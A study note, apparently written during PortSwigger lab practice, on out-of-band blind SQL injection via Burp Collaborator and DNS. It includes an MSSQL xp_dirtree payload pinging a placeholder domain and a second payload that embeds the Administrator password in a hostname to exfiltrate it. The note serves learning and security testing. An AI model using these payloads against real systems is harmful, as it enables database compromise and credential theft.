# Blind SQL Injection - OAST

## Overview

OAST stands for:

    Out-of-Band Application Security Testing

OAST techniques can be used when:

- The application is vulnerable to SQL injection.
- The HTTP response does not contain useful information.
- Database errors are not visible.
- Time delays are not reliable or possible.

Instead of waiting for the application to return information directly, we cause the database to make an external network request to a system we control.

---

## OAST Concept

The basic flow is:

    SQL Injection
          ↓
    Database executes injected query
          ↓
    Database makes external request
          ↓
    OAST server receives interaction
          ↓
    Attacker observes the interaction

DNS is commonly useful because many environments allow DNS requests even when other outbound traffic is restricted.

---

## Burp Collaborator

PortSwigger's OAST labs use Burp Collaborator to detect out-of-band interactions.

Burp Collaborator provides a unique external domain that can be monitored for interactions such as:

- DNS requests
- HTTP requests
- Other network interactions

The attacker places the Collaborator domain inside the SQL injection payload.

If the database attempts to resolve or connect to that domain, the interaction confirms that the SQL injection can trigger an out-of-band request.

---

## Detecting OAST-Based SQL Injection

A simplified example using Microsoft SQL Server is:

    '; exec master..xp_dirtree '//DOMAIN/a'--

The important part is:

    //DOMAIN/a

The database attempts to access the external domain.

The basic workflow becomes:

    SQL Injection
          ↓
    xp_dirtree
          ↓
    DNS lookup
          ↓
    Collaborator
          ↓
    Interaction detected

---

## Exfiltrating Data Through OAST

OAST can also be used to exfiltrate data by placing the result of a SQL query inside the external hostname.

Example:

    '; declare @p varchar(1024); set @p=(SELECT password FROM users WHERE username='Administrator'); exec('master..xp_dirtree "//'+@p+'.BURPCOLLABORATOR-DOMAIN/a"')--

The password is incorporated into the hostname.

Conceptually:

    Database value
          ↓
    External hostname
          ↓
    DNS request
          ↓
    Collaborator
          ↓
    Observed interaction

This allows data to be extracted even when the application's HTTP response does not reveal it.

---

## Practical Workflow

    1. Identify a possible blind SQL injection
            ↓
    2. Determine that normal responses are not useful
            ↓
    3. Generate an OAST/Collaborator domain
            ↓
    4. Inject the domain into the SQL query
            ↓
    5. Monitor for external interactions
            ↓
    6. Confirm the vulnerability
            ↓
    7. If possible, place database data into the external request
            ↓
    8. Read the exfiltrated value from the interaction

---

## Lab Notes

The PortSwigger OAST labs required Burp Collaborator to detect the external interaction and exfiltrate data.

The labs could not be fully reproduced in my current setup because Burp Collaborator functionality required for these exercises was not available in my Burp Community Edition environment.

The OAST technique and attack flow were studied and documented.

---

## Key Takeaways

- OAST means Out-of-Band Application Security Testing.
- OAST is useful when the application provides no useful direct response.
- DNS is commonly used for out-of-band interactions.
- Burp Collaborator can detect external DNS and HTTP interactions.
- SQL injection can sometimes trigger external requests from the database.
- Database values can potentially be embedded into external hostnames and exfiltrated.
- OAST extends blind SQL injection testing beyond the application's normal HTTP response.